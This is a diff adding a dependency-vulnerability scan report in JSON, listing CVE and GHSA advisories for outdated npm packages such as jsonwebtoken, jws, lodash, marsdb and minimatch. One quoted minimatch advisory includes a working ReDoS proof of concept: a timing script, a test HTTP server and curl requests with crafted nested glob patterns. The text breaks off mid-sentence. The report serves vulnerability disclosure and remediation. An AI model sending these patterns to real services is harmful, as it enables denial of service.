+      "vulnerabilities": [
+        {
+          "source": "NVD",
+          "name": "CVE-2015-9235",
+          "severity": "CRITICAL",
+          "description": "In jsonwebtoken node module before 4.2.2 it is possible for an attacker to bypass verification when a token digitally signed with an asymmetric key (RS/ES family) of algorithms but instead the attacker send a token digitally signed with a symmetric algorithm (HS* family)."
+        },
+        {
+          "source": "NPM",
+          "name": "GHSA-c7hr-j4mj-j2w6 (NPM)",
+          "severity": "CRITICAL",
+          "description": "Versions 4.2.1 and earlier of `jsonwebtoken` are affected by a verification bypass vulnerability. This is a result of weak validation of the JWT algorithm type, occuring when an attacker is allowed to arbitrarily specify the JWT algorithm.     ## Recommendation  Update to version 4.2.2 or later."
+        },
+        {
+          "source": "NPM",
+          "name": "GHSA-8cf7-32gw-wr33 (NPM)",
+          "severity": "HIGH",
+          "description": "# Overview  Versions `&lt;=8.5.1` of `jsonwebtoken` library could be misconfigured so that legacy, insecure key types are used for signature verification. For example, DSA keys could be used with the RS256 algorithm.   # Am I affected?  You are affected if you are using an algorithm and a key type other than the combinations mentioned below  | Key type |  algorithm                                    | |----------|------------------------------------------| | ec           | ES256, ES384, ES512                      | | rsa          | RS256, RS384, RS512, PS256, PS384, PS512 | | rsa-pss  | PS256, PS384, PS512                      |  And for Elliptic Curve algorithms:  | `alg` | Curve      | |-------|------------| | ES256 | prime256v1 | | ES384 | secp384r1  | | ES512 | secp521r1  |  # How do I fix it?  Update to version 9.0.0. This version validates for asymmetric key type and algorithm combinations. Please refer to the above mentioned algorithm / key type combinations for the valid secure configuration. After updating to version 9.0.0, If you still intend to continue with signing or verifying tokens using invalid key type/algorithm value combinations, you&rsquo;ll need to set the `allowInvalidAsymmetricKeyTypes` option to `true` in the `sign()` and/or `verify()` functions.  # Will the fix impact my users?  There will be no impact, if you update to version 9.0.0 and you already use a valid secure combination of key type and algorithm. Otherwise,  use the  `allowInvalidAsymmetricKeyTypes` option  to `true` in the `sign()` and `verify()` functions to continue usage of invalid key type/algorithm combination in 9.0.0 for legacy compatibility."
+        },
+        {
+          "source": "NVD",
+          "name": "CVE-2022-23539",
+          "severity": "HIGH",
+          "description": "Versions `&lt;=8.5.1` of `jsonwebtoken` library could be misconfigured so that legacy, insecure key types are used for signature verification. For example, DSA keys could be used with the RS256 algorithm. You are affected if you are using an algorithm and a key type other than a combination listed in the GitHub Security Advisory as unaffected. This issue has been fixed, please update to version 9.0.0. This version validates for asymmetric key type and algorithm combinations. Please refer to the above mentioned algorithm / key type combinations for the valid secure configuration. After updating to version 9.0.0, if you still intend to continue with signing or verifying tokens using invalid key type/algorithm value combinations, you&rsquo;ll need to set the `allowInvalidAsymmetricKeyTypes` option  to `true` in the `sign()` and/or `verify()` functions."
+        },
+        {
+          "source": "NVD",
+          "name": "CVE-2022-23540",
+          "severity": "HIGH",
+          "description": "In versions `&lt;=8.5.1` of `jsonwebtoken` library, lack of algorithm definition in the `jwt.verify()` function can lead to signature validation bypass due to defaulting to the `none` algorithm for signature verification. Users are affected if you do not specify algorithms in the `jwt.verify()` function. This issue has been fixed, please update to version 9.0.0 which removes the default support for the none algorithm in the `jwt.verify()` method. There will be no impact, if you update to version 9.0.0 and you don&rsquo;t need to allow for the `none` algorithm. If you need 'none' algorithm, you have to explicitly specify that in `jwt.verify()` options."
+        },
+        {
+          "source": "NPM",
+          "name": "GHSA-qwph-4952-7xr6 (NPM)",
+          "severity": "MEDIUM",
+          "description": "# Overview  In versions &lt;=8.5.1 of jsonwebtoken library, lack of algorithm definition and a falsy secret or key in the `jwt.verify()` function can lead to signature validation bypass due to defaulting to the `none` algorithm for signature verification.  # Am I affected? You will be affected if all the following are true in the `jwt.verify()` function: - a token with no signature is received - no algorithms are specified  - a falsy (e.g. null, false, undefined) secret or key is passed   # How do I fix it?   Update to version 9.0.0 which removes the default support for the none algorithm in the `jwt.verify()` method.   # Will the fix impact my users?  There will be no impact, if you update to version 9.0.0 and you don&rsquo;t need to allow for the `none` algorithm. If you need 'none' algorithm, you have to explicitly specify that in `jwt.verify()` options."
+        },
+        {
+          "source": "NVD",
+          "name": "CVE-2022-23541",
+          "severity": "MEDIUM",
+          "description": "jsonwebtoken is an implementation of JSON Web Tokens. Versions `&lt;= 8.5.1` of `jsonwebtoken` library can be misconfigured so that passing a poorly implemented key retrieval function referring to the `secretOrPublicKey` argument from the readme link will result in incorrect verification of tokens. There is a possibility of using a different algorithm and key combination in verification, other than the one that was used to sign the tokens. Specifically, tokens signed with an asymmetric public key could be verified with a symmetric HS256 algorithm. This can lead to successful validation of  forged tokens. If your application is supporting usage of both symmetric key and asymmetric key in jwt.verify() implementation with the same key retrieval function. This issue has been patched, please update to version 9.0.0."
+        },
+        {
+          "source": "NPM",
+          "name": "GHSA-hjrf-2m68-5959 (NPM)",
+          "severity": "MEDIUM",
+          "description": "# Overview  Versions `&lt;=8.5.1` of `jsonwebtoken` library can be misconfigured so that passing a poorly implemented key retrieval function (referring to the `secretOrPublicKey` argument from the [readme link](https://github.com/auth0/node-jsonwebtoken#jwtverifytoken-secretorpublickey-options-callback)) will result in incorrect verification of tokens. There is a possibility of using a different algorithm and key combination in verification  than the one that was used to sign the tokens. Specifically, tokens signed with an asymmetric public key could be verified with a symmetric HS256 algorithm. This can lead to successful validation of forged tokens.   # Am I affected?  You will be affected if your application is supporting usage of both symmetric key and asymmetric key in jwt.verify() implementation with the same key retrieval function.   # How do I fix it?   Update to version 9.0.0.  # Will the fix impact my users?  There is no impact for end users"
+        }
+      ],
+      "filePath": "/src/package-lock.json?/jsonwebtoken:0.4.0"
+    },
+    {
+      "isVirtual": false,
+      "fileName": "jws:0.2.6",
+      "projectReferences": [
+        "package.json"
+      ],
+      "vulnerabilities": [
+        {
+          "source": "NPM",
+          "name": "GHSA-gjcw-v447-2w7q (NPM)",
+          "severity": "HIGH",
+          "description": "Affected versions of the `jws` package allow users to select what algorithm the server will use to verify a provided JWT. A malicious actor can use this behaviour to arbitrarily modify the contents of a JWT while still passing verification. For the common use case of the JWT as a bearer token, the end result is a complete authentication bypass with minimal effort.     ## Recommendation  Update to version 3.0.0 or later."
+        },
+        {
+          "source": "NPM",
+          "name": "GHSA-869p-cjfg-cm3x (NPM)",
+          "severity": "HIGH",
+          "description": "### Overview An improper signature verification vulnerability exists when using auth0/node-jws with the HS256 algorithm under specific conditions.  ### Am I Affected? You are affected by this vulnerability if you meet all of the following preconditions:  1. Application uses the auth0/node-jws implementation of JSON Web Signatures, versions &lt;=3.2.2 || 4.0.0 2. Application uses the jws.createVerify() function for HMAC algorithms 3. Application uses user-provided data from the JSON Web Signature Protected Header or Payload in the HMAC secret lookup routines  You are NOT affected by this vulnerability if you meet any of the following preconditions: 1. Application uses the jws.verify() interface (note: `auth0/node-jsonwebtoken` users fall into this category and are therefore NOT affected by this vulnerability) 2. Application uses only asymmetric algorithms (e.g. RS256) 3. Application doesn&rsquo;t use user-provided data from the JSON Web Signature Protected Header or Payload in the HMAC secret lookup routines  ### Fix Upgrade auth0/node-jws version to version 3.2.3 or 4.0.1  ### Acknowledgement Okta would like to thank F&eacute;lix Charette for discovering this vulnerability."
+        }
+      ],
+      "filePath": "/src/package-lock.json?/jws:0.2.6"
+    },
+    {
+      "isVirtual": false,
+      "fileName": "lodash.js",
+      "projectReferences": [
+        "package.json"
+      ],
+      "vulnerabilities": [
+        {
+          "source": "NVD",
+          "name": "CVE-2019-10744",
+          "severity": "CRITICAL",
+          "description": "Versions of lodash lower than 4.17.12 are vulnerable to Prototype Pollution. The function defaultsDeep could be tricked into adding or modifying properties of Object.prototype using a constructor payload."
+        },
+        {
+          "source": "NVD",
+          "name": "CVE-2021-23337",
+          "severity": "HIGH",
+          "description": "Lodash versions prior to 4.17.21 are vulnerable to Command Injection via the template function."
+        },
+        {
+          "source": "NVD",
+          "name": "CVE-2018-3721",
+          "severity": "MEDIUM",
+          "description": "lodash node module before 4.17.5 suffers from a Modification of Assumed-Immutable Data (MAID) vulnerability via defaultsDeep, merge, and mergeWith functions, which allows a malicious user to modify the prototype of &quot;Object&quot; via __proto__, causing the addition or modification of an existing property that will exist on all objects."
+        },
+        {
+          "source": "NVD",
+          "name": "CVE-2018-16487",
+          "severity": "MEDIUM",
+          "description": "A prototype pollution vulnerability was found in lodash &lt;4.17.11 where the functions merge, mergeWith, and defaultsDeep can be tricked into adding or modifying properties of Object.prototype."
+        },
+        {
+          "source": "NVD",
+          "name": "CVE-2026-2950",
+          "severity": "MEDIUM",
+          "description": "Impact:  Lodash versions 4.17.23 and earlier are vulnerable to prototype pollution in the _.unset and _.omit functions. The fix for (CVE-2025-13465: https://github.com/lodash/lodash/security/advisories/GHSA-xxjr-mmjv-4gpg) only guards against string key members, so an attacker can bypass the check by passing array-wrapped path segments. This allows deletion of properties from built-in prototypes such as Object.prototype, Number.prototype, and String.prototype.  The issue permits deletion of prototype properties but does not allow overwriting their original behavior.  Patches:  This issue is patched in 4.18.0.  Workarounds:  None. Upgrade to the patched version."
+        }
+      ],
+      "filePath": "/src/node_modules/sanitize-html/node_modules/lodash/dist/lodash.js",
+      "md5": "fe02da36c6a43edfd7d8fae2945e2080",
+      "sha1": "1996aca565068a71066e2af03101a073f0cf12b6",
+      "sha256": "dc82877fec267f8edc9a20c63870d0f5660d88aed921f75f8f06006a4a0ae022"
+    },
+    {
+      "isVirtual": false,
+      "fileName": "lodash.js",
+      "projectReferences": [
+        "package.json"
+      ],
+      "vulnerabilities": [
+        {
+          "source": "NVD",
+          "name": "CVE-2019-10744",
+          "severity": "CRITICAL",
+          "description": "Versions of lodash lower than 4.17.12 are vulnerable to Prototype Pollution. The function defaultsDeep could be tricked into adding or modifying properties of Object.prototype using a constructor payload."
+        },
+        {
+          "source": "NVD",
+          "name": "CVE-2021-23337",
+          "severity": "HIGH",
+          "description": "Lodash versions prior to 4.17.21 are vulnerable to Command Injection via the template function."
+        },
+        {
+          "source": "NVD",
+          "name": "CVE-2018-3721",
+          "severity": "MEDIUM",
+          "description": "lodash node module before 4.17.5 suffers from a Modification of Assumed-Immutable Data (MAID) vulnerability via defaultsDeep, merge, and mergeWith functions, which allows a malicious user to modify the prototype of &quot;Object&quot; via __proto__, causing the addition or modification of an existing property that will exist on all objects."
+        },
+        {
+          "source": "NVD",
+          "name": "CVE-2018-16487",
+          "severity": "MEDIUM",
+          "description": "A prototype pollution vulnerability was found in lodash &lt;4.17.11 where the functions merge, mergeWith, and defaultsDeep can be tricked into adding or modifying properties of Object.prototype."
+        },
+        {
+          "source": "NVD",
+          "name": "CVE-2026-2950",
+          "severity": "MEDIUM",
+          "description": "Impact:  Lodash versions 4.17.23 and earlier are vulnerable to prototype pollution in the _.unset and _.omit functions. The fix for (CVE-2025-13465: https://github.com/lodash/lodash/security/advisories/GHSA-xxjr-mmjv-4gpg) only guards against string key members, so an attacker can bypass the check by passing array-wrapped path segments. This allows deletion of properties from built-in prototypes such as Object.prototype, Number.prototype, and String.prototype.  The issue permits deletion of prototype properties but does not allow overwriting their original behavior.  Patches:  This issue is patched in 4.18.0.  Workarounds:  None. Upgrade to the patched version."
+        }
+      ],
+      "filePath": "/src/node_modules/sanitize-html/node_modules/lodash/lodash.js",
+      "md5": "ea3013cfb89699ef71be5dae72341f2c",
+      "sha1": "16c0086b96a8445c20936b8053d7b8f62638af76",
+      "sha256": "df565a14d7130f9867e31e1d598082d4cdddf41d7697cb300f82e62bbcef14ab"
+    },
+    {
+      "isVirtual": false,
+      "fileName": "lodash.min.js",
+      "projectReferences": [
+        "package.json"
+      ],
+      "vulnerabilities": [
+        {
+          "source": "NVD",
+          "name": "CVE-2019-10744",
+          "severity": "CRITICAL",
+          "description": "Versions of lodash lower than 4.17.12 are vulnerable to Prototype Pollution. The function defaultsDeep could be tricked into adding or modifying properties of Object.prototype using a constructor payload."
+        },
+        {
+          "source": "NVD",
+          "name": "CVE-2021-23337",
+          "severity": "HIGH",
+          "description": "Lodash versions prior to 4.17.21 are vulnerable to Command Injection via the template function."
+        },
+        {
+          "source": "NVD",
+          "name": "CVE-2018-3721",
+          "severity": "MEDIUM",
+          "description": "lodash node module before 4.17.5 suffers from a Modification of Assumed-Immutable Data (MAID) vulnerability via defaultsDeep, merge, and mergeWith functions, which allows a malicious user to modify the prototype of &quot;Object&quot; via __proto__, causing the addition or modification of an existing property that will exist on all objects."
+        },
+        {
+          "source": "NVD",
+          "name": "CVE-2018-16487",
+          "severity": "MEDIUM",
+          "description": "A prototype pollution vulnerability was found in lodash &lt;4.17.11 where the functions merge, mergeWith, and defaultsDeep can be tricked into adding or modifying properties of Object.prototype."
+        },
+        {
+          "source": "NVD",
+          "name": "CVE-2026-2950",
+          "severity": "MEDIUM",
+          "description": "Impact:  Lodash versions 4.17.23 and earlier are vulnerable to prototype pollution in the _.unset and _.omit functions. The fix for (CVE-2025-13465: https://github.com/lodash/lodash/security/advisories/GHSA-xxjr-mmjv-4gpg) only guards against string key members, so an attacker can bypass the check by passing array-wrapped path segments. This allows deletion of properties from built-in prototypes such as Object.prototype, Number.prototype, and String.prototype.  The issue permits deletion of prototype properties but does not allow overwriting their original behavior.  Patches:  This issue is patched in 4.18.0.  Workarounds:  None. Upgrade to the patched version."
+        }
+      ],
+      "filePath": "/src/node_modules/sanitize-html/node_modules/lodash/dist/lodash.min.js",
+      "md5": "06f73bae52f76c868fa98f50f701f55f",
+      "sha1": "8d11f71e6c10af1baa47f42b06c229b372367985",
+      "sha256": "9c070c2008d0acff62203fcd6db804e3baf559032eb7b5fe715242b0de3f52f0"
+    },
+    {
+      "isVirtual": false,
+      "fileName": "lodash.set:4.3.2",
+      "projectReferences": [
+        "package.json"
+      ],
+      "vulnerabilities": [
+        {
+          "source": "NPM",
+          "name": "GHSA-p6mc-m468-83gw (NPM)",
+          "severity": "HIGH",
+          "description": "Versions of lodash prior to 4.17.19 are vulnerable to Prototype Pollution. The functions `pick`, `set`, `setWith`, `update`, `updateWith`, and `zipObjectDeep` allow a malicious user to modify the prototype of Object if the property identifiers are user-supplied. Being affected by this issue requires manipulating objects based on user-provided property values or arrays.  This vulnerability causes the addition or modification of an existing property that will exist on all objects and may lead to Denial of Service or Code Execution under specific circumstances."
+        }
+      ],
+      "filePath": "/src/package-lock.json?/lodash.set:4.3.2"
+    },
+    {
+      "isVirtual": false,
+      "fileName": "lodash:2.4.2",
+      "projectReferences": [
+        "package.json"
+      ],
+      "vulnerabilities": [
+        {
+          "source": "NPM",
+          "name": "GHSA-jf85-cpcp-j695 (NPM)",
+          "severity": "CRITICAL",
+          "description": "Versions of `lodash` before 4.17.12 are vulnerable to Prototype Pollution.  The function `defaultsDeep` allows a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.  ## Recommendation  Update to version 4.17.12 or later."
+        },
+        {
+          "source": "NVD",
+          "name": "CVE-2019-10744",
+          "severity": "CRITICAL",
+          "description": "Versions of lodash lower than 4.17.12 are vulnerable to Prototype Pollution. The function defaultsDeep could be tricked into adding or modifying properties of Object.prototype using a constructor payload."
+        },
+        {
+          "source": "NVD",
+          "name": "CVE-2020-8203",
+          "severity": "HIGH",
+          "description": "Prototype pollution attack when using _.zipObjectDeep in lodash before 4.17.20."
+        },
+        {
+          "source": "NVD",
+          "name": "CVE-2021-23337",
+          "severity": "HIGH",
+          "description": "Lodash versions prior to 4.17.21 are vulnerable to Command Injection via the template function."
+        },
+        {
+          "source": "NPM",
+          "name": "GHSA-35jh-r3h4-6jhm (NPM)",
+          "severity": "HIGH",
+          "description": "`lodash` versions prior to 4.17.21 are vulnerable to Command Injection via the template function."
+        },
+        {
+          "source": "NPM",
+          "name": "GHSA-4xc9-xhrj-v574 (NPM)",
+          "severity": "HIGH",
+          "description": "Versions of `lodash` before 4.17.11 are vulnerable to prototype pollution.   The vulnerable functions are 'defaultsDeep', 'merge', and 'mergeWith' which allow a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.     ## Recommendation  Update to version 4.17.11 or later."
+        },
+        {
+          "source": "NVD",
+          "name": "CVE-2018-3721",
+          "severity": "MEDIUM",
+          "description": "lodash node module before 4.17.5 suffers from a Modification of Assumed-Immutable Data (MAID) vulnerability via defaultsDeep, merge, and mergeWith functions, which allows a malicious user to modify the prototype of &quot;Object&quot; via __proto__, causing the addition or modification of an existing property that will exist on all objects."
+        },
+        {
+          "source": "NVD",
+          "name": "CVE-2019-1010266",
+          "severity": "MEDIUM",
+          "description": "lodash prior to 4.17.11 is affected by: CWE-400: Uncontrolled Resource Consumption. The impact is: Denial of service. The component is: Date handler. The attack vector is: Attacker provides very long strings, which the library attempts to match using a regular expression. The fixed version is: 4.17.11."
+        },
+        {
+          "source": "NPM",
+          "name": "GHSA-f23m-r3pf-42rh (NPM)",
+          "severity": "MEDIUM",
+          "description": "### Impact  Lodash versions 4.17.23 and earlier are vulnerable to prototype pollution in the `_.unset` and `_.omit` functions. The fix for [CVE-2025-13465](https://github.com/lodash/lodash/security/advisories/GHSA-xxjr-mmjv-4gpg) only guards against string key members, so an attacker can bypass the check by passing array-wrapped path segments. This allows deletion of properties from built-in prototypes such as `Object.prototype`, `Number.prototype`, and `String.prototype`.  The issue permits deletion of prototype properties but does not allow overwriting their original behavior.  ### Patches  This issue is patched in 4.18.0.  ### Workarounds  None. Upgrade to the patched version."
+        },
+        {
+          "source": "NPM",
+          "name": "GHSA-fvqr-27wr-82fm (NPM)",
+          "severity": "MEDIUM",
+          "description": "Versions of `lodash` before 4.17.5 are vulnerable to prototype pollution.   The vulnerable functions are 'defaultsDeep', 'merge', and 'mergeWith' which allow a malicious user to modify the prototype of `Object` via `__proto__` causing the addition or modification of an existing property that will exist on all objects.     ## Recommendation  Update to version 4.17.5 or later."
+        },
+        {
+          "source": "NVD",
+          "name": "CVE-2018-16487",
+          "severity": "MEDIUM",
+          "description": "A prototype pollution vulnerability was found in lodash &lt;4.17.11 where the functions merge, mergeWith, and defaultsDeep can be tricked into adding or modifying properties of Object.prototype."
+        },
+        {
+          "source": "NVD",
+          "name": "CVE-2020-28500",
+          "severity": "MEDIUM",
+          "description": "Lodash versions prior to 4.17.21 are vulnerable to Regular Expression Denial of Service (ReDoS) via the toNumber, trim and trimEnd functions."
+        }
+      ],
+      "filePath": "/src/package-lock.json?/lodash:2.4.2"
+    },
+    {
+      "isVirtual": false,
+      "fileName": "marsdb:0.6.11",
+      "projectReferences": [
+        "package.json"
+      ],
+      "vulnerabilities": [
+        {
+          "source": "NPM",
+          "name": "GHSA-5mrr-rgp6-x4gr (NPM)",
+          "severity": "CRITICAL",
+          "description": "All versions of `marsdb` are vulnerable to Command Injection. In the `DocumentMatcher` class, selectors on `$where` clauses are passed to a Function constructor unsanitized. This allows attackers to run arbitrary commands in the system when the function is executed.   ## Recommendation  No fix is currently available. Consider using an alternative package until a fix is made available."
+        }
+      ],
+      "filePath": "/src/package-lock.json?/marsdb:0.6.11"
+    },
+    {
+      "isVirtual": false,
+      "fileName": "minimatch:3.0.5",
+      "projectReferences": [
+        "package.json"
+      ],
+      "vulnerabilities": [
+        {
+          "source": "NVD",
+          "name": "CVE-2026-26996",
+          "severity": "HIGH",
+          "description": "minimatch is a minimal matching utility for converting glob expressions into JavaScript RegExp objects. Versions 10.2.0 and below are vulnerable to Regular Expression Denial of Service (ReDoS) when a glob pattern contains many consecutive * wildcards followed by a literal character that doesn't appear in the test string. Each * compiles to a separate [^/]*? regex group, and when the match fails, V8's regex engine backtracks exponentially across all possible splits. The time complexity is O(4^N) where N is the number of * characters. With N=15, a single minimatch() call takes ~2 seconds. With N=34, it hangs effectively forever. Any application that passes user-controlled strings to minimatch() as the pattern argument is vulnerable to DoS. This issue has been fixed in version 10.2.1."
+        },
+        {
+          "source": "NVD",
+          "name": "CVE-2026-27903",
+          "severity": "HIGH",
+          "description": "minimatch is a minimal matching utility for converting glob expressions into JavaScript RegExp objects. Prior to version 10.2.3, 9.0.7, 8.0.6, 7.4.8, 6.2.2, 5.1.8, 4.2.5, and 3.1.3, `matchOne()` performs unbounded recursive backtracking when a glob pattern contains multiple non-adjacent `**` (GLOBSTAR) segments and the input path does not match. The time complexity is O(C(n, k)) -- binomial -- where `n` is the number of path segments and `k` is the number of globstars. With k=11 and n=30, a call to the default `minimatch()` API stalls for roughly 5 seconds. With k=13, it exceeds 15 seconds. No memoization or call budget exists to bound this behavior. Any application where an attacker can influence the glob pattern passed to `minimatch()` is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments (ESLint, Webpack, Rollup config), multi-tenant systems where one tenant configures glob-based rules that run in a shared process, admin or developer interfaces that accept ignore-rule or filter configuration as globs, and CI/CD pipelines that evaluate user-submitted config files containing glob patterns. An attacker who can place a crafted pattern into any of these paths can stall the Node.js event loop for tens of seconds per invocation. The pattern is 56 bytes for a 5-second stall and does not require authentication in contexts where pattern input is part of the feature. Versions 10.2.3, 9.0.7, 8.0.6, 7.4.8, 6.2.2, 5.1.8, 4.2.5, and 3.1.3 fix the issue."
+        },
+        {
+          "source": "NVD",
+          "name": "CVE-2026-27904",
+          "severity": "HIGH",
+          "description": "minimatch is a minimal matching utility for converting glob expressions into JavaScript RegExp objects. Prior to version 10.2.3, 9.0.7, 8.0.6, 7.4.8, 6.2.2, 5.1.8, 4.2.5, and 3.1.4, nested `*()` extglobs produce regexps with nested unbounded quantifiers (e.g. `(?:(?:a|b)*)*`), which exhibit catastrophic backtracking in V8. With a 12-byte pattern `*(*(*(a|b)))` and an 18-byte non-matching input, `minimatch()` stalls for over 7 seconds. Adding a single nesting level or a few input characters pushes this to minutes. This is the most severe finding: it is triggered by the default `minimatch()` API with no special options, and the minimum viable pattern is only 12 bytes. The same issue affects `+()` extglobs equally. Versions 10.2.3, 9.0.7, 8.0.6, 7.4.8, 6.2.2, 5.1.8, 4.2.5, and 3.1.4 fix the issue."
+        },
+        {
+          "source": "NPM",
+          "name": "GHSA-23c5-xmqv-rm74 (NPM)",
+          "severity": "HIGH",
+          "description": "### Summary  Nested `*()` extglobs produce regexps with nested unbounded quantifiers (e.g. `(?:(?:a|b)*)*`), which exhibit catastrophic backtracking in V8. With a 12-byte pattern `*(*(*(a|b)))` and an 18-byte non-matching input, `minimatch()` stalls for over 7 seconds. Adding a single nesting level or a few input characters pushes this to minutes. This is the most severe finding: it is triggered by the default `minimatch()` API with no special options, and the minimum viable pattern is only 12 bytes. The same issue affects `+()` extglobs equally.  ---  ### Details  The root cause is in `AST.toRegExpSource()` at [`src/ast.ts#L598`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/ast.ts#L598). For the `*` extglob type, the close token emitted is `)*` or `)?`, wrapping the recursive body in `(?:...)*`. When extglobs are nested, each level adds another `*` quantifier around the previous group:  ```typescript : this.type === '*' &amp;&amp; bodyDotAllowed ? `)?` : `)${this.type}` ```  This produces the following regexps:  | Pattern              | Generated regex                          | |----------------------|------------------------------------------| | `*(a\\|b)`            | `/^(?:a\\|b)*$/`                          | | `*(*(a\\|b))`         | `/^(?:(?:a\\|b)*)*$/`                     | | `*(*(*(a\\|b)))`      | `/^(?:(?:(?:a\\|b)*)*)*$/`               | | `*(*(*(*(a\\|b))))` | `/^(?:(?:(?:(?:a\\|b)*)*)*)*$/`          |  These are textbook nested-quantifier patterns. Against an input of repeated `a` characters followed by a non-matching character `z`, V8's backtracking engine explores an exponential number of paths before returning `false`.  The generated regex is stored on `this.set` and evaluated inside `matchOne()` at [`src/index.ts#L1010`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/index.ts#L1010) via `p.test(f)`. It is reached through the standard `minimatch()` call with no configuration.  Measured times via `minimatch()`:  | Pattern              | Input              | Time       | |----------------------|--------------------|------------| | `*(*(a\\|b))`         | `a` x30 + `z`      | ~68,000ms  | | `*(*(*(a\\|b)))`      | `a` x20 + `z`      | ~124,000ms | | `*(*(*(*(a\\|b))))` | `a` x25 + `z`      | ~116,000ms | | `*(a\\|a)`            | `a` x25 + `z`      | ~2,000ms   |  Depth inflection at fixed input `a` x16 + `z`:  | Depth | Pattern              | Time         | |-------|----------------------|--------------| | 1     | `*(a\\|b)`            | 0ms          | | 2     | `*(*(a\\|b))`         | 4ms          | | 3     | `*(*(*(a\\|b)))`      | 270ms        | | 4     | `*(*(*(*(a\\|b))))` | 115,000ms    |  Going from depth 2 to depth 3 with a 20-character input jumps from 66ms to 123,544ms -- a 1,867x increase from a single added nesting level.  ---  ### PoC  Tested on minimatch@10.2.2, Node.js 20.  **Step 1 -- verify the generated regexps and timing (standalone script)**  Save as `poc4-validate.mjs` and run with `node poc4-validate.mjs`:  ```javascript import { minimatch, Minimatch } from 'minimatch'  function timed(fn) {   const s = process.hrtime.bigint()   let result, error   try { result = fn() } catch(e) { error = e }   const ms = Number(process.hrtime.bigint() - s) / 1e6   return { ms, result, error } }  // Verify generated regexps for (let depth = 1; depth &lt;= 4; depth++) {   let pat = 'a|b'   for (let i = 0; i &lt; depth; i++) pat = `*(${pat})`   const re = new Minimatch(pat, {}).set?.[0]?.[0]?.toString()   console.log(`depth=${depth} &quot;${pat}&quot; -&gt; ${re}`) } // depth=1 &quot;*(a|b)&quot;          -&gt; /^(?:a|b)*$/ // depth=2 &quot;*(*(a|b))&quot;       -&gt; /^(?:(?:a|b)*)*$/ // depth=3 &quot;*(*(*(a|b)))&quot;    -&gt; /^(?:(?:(?:a|b)*)*)*$/ // depth=4 &quot;*(*(*(*(a|b))))&quot; -&gt; /^(?:(?:(?:(?:a|b)*)*)*)*$/  // Safe-length timing (exponential growth confirmation without multi-minute hang) const cases = [   ['*(*(*(a|b)))', 15],   // ~270ms   ['*(*(*(a|b)))', 17],   // ~800ms   ['*(*(*(a|b)))', 19],   // ~2400ms   ['*(*(a|b))',    23],   // ~260ms   ['*(a|b)',      101],   // &lt;5ms (depth=1 control) ] for (const [pat, n] of cases) {   const t = timed(() =&gt; minimatch('a'.repeat(n) + 'z', pat))   console.log(`&quot;${pat}&quot; n=${n}: ${t.ms.toFixed(0)}ms result=${t.result}`) }  // Confirm noext disables the vulnerability const t_noext = timed(() =&gt; minimatch('a'.repeat(18) + 'z', '*(*(*(a|b)))', { noext: true })) console.log(`noext=true: ${t_noext.ms.toFixed(0)}ms (should be ~0ms)`)  // +() is equally affected const t_plus = timed(() =&gt; minimatch('a'.repeat(17) + 'z', '+(+(+(a|b)))')) console.log(`&quot;+(+(+(a|b)))&quot; n=18: ${t_plus.ms.toFixed(0)}ms result=${t_plus.result}`) ```  Observed output: ``` depth=1 &quot;*(a|b)&quot;          -&gt; /^(?:a|b)*$/ depth=2 &quot;*(*(a|b))&quot;       -&gt; /^(?:(?:a|b)*)*$/ depth=3 &quot;*(*(*(a|b)))&quot;    -&gt; /^(?:(?:(?:a|b)*)*)*$/ depth=4 &quot;*(*(*(*(a|b))))&quot; -&gt; /^(?:(?:(?:(?:a|b)*)*)*)*$/ &quot;*(*(*(a|b)))&quot; n=15: 269ms result=false &quot;*(*(*(a|b)))&quot; n=17: 268ms result=false &quot;*(*(*(a|b)))&quot; n=19: 2408ms result=false &quot;*(*(a|b))&quot;    n=23: 257ms result=false &quot;*(a|b)&quot;       n=101: 0ms result=false noext=true: 0ms (should be ~0ms) &quot;+(+(+(a|b)))&quot; n=18: 6300ms result=false ```  **Step 2 -- HTTP server (event loop starvation proof)**  Save as `poc4-server.mjs`:  ```javascript import http from 'node:http' import { URL } from 'node:url' import { minimatch } from 'minimatch'  const PORT = 3001 http.createServer((req, res) =&gt; {   const url     = new URL(req.url, `http://localhost:${PORT}`)   const pattern = url.searchParams.get('pattern') ?? ''   const path    = url.searchParams.get('path') ?? ''    const start  = process.hrtime.bigint()   const result = minimatch(path, pattern)   const ms     = Number(process.hrtime.bigint() - start) / 1e6    console.log(`[${new Date().toISOString()}] ${ms.toFixed(0)}ms pattern=&quot;${pattern}&quot; path=&quot;${path.slice(0,30)}&quot;`)   res.writeHead(200, { 'Content-Type': 'application/json' })   res.end(JSON.stringify({ result, ms: ms.toFixed(0) }) + '\\n') }).listen(PORT, () =&gt; console.log(`listening on ${PORT}`)) ```  Terminal 1 -- start the server: ``` node poc4-server.mjs ```  Terminal 2 -- fire the attack (depth=3, 19 a's + z) and return immediately: ``` curl &quot;http://localhost:3001/match?pattern=*%28*%28*%28a%7Cb%29%29%29&amp;path=aaaaaaaaaaaaaaaaaaaz&quot; &amp; ```  Terminal 3 -- send a benign request while the attack is in-flight: ``` curl -w &quot;\\ntime_total: %{time_total}s\\n&quot; &quot;http://localhost:3001/match?pattern=*%28a%7Cb%29&amp;path=aaaz&quot; ```  **Observed output -- Terminal 2 (attack):** ``` {&quot;result&quot;:false,&quot;ms&quot;:&quot;64149&quot;} ```  **Observed output -- Terminal 3 (benign, concurrent):** ``` {&quot;result&quot;:false,&quot;ms&quot;:&quot;0&quot;}  time_total: 63.022047s ```  **Terminal 1 (server log):** ``` [2026-02-20T09:41:17.624Z] pattern=&quot;*(*(*(a|b)))&quot; path=&quot;aaaaaaaaaaaaaaaaaaaz&quot; [2026-02-20T09:42:21.775Z] done in 64149ms result=false [2026-02-20T09:42:21.779Z] pattern=&quot;*(a|b)&quot; path=&quot;aaaz&quot; [2026-02-20T09:42:21.779Z] done in 0ms result=false ```  The server reports `&quot;ms&quot;:&quot;0&quot;` for the benign request -- the legitimate request itself requires no CPU time. The entire 63-second `time_total` is time spent waiting for the event loop to be released. The benign request was only dispatched after the attack completed, confirmed by the server log timestamps.  Note: standalone script timing (~7s at n=19) is lower than server timing (64s) because the standalone script had warmed up V8's JIT through earlier sequential calls. A cold server hits the worst case. Both measurements confirm catastrophic backtracking -- the server result is the more realistic figure for production impact.  ---  ### Impact  Any context where an attacker can influence the glob pattern passed to `minimatch()` 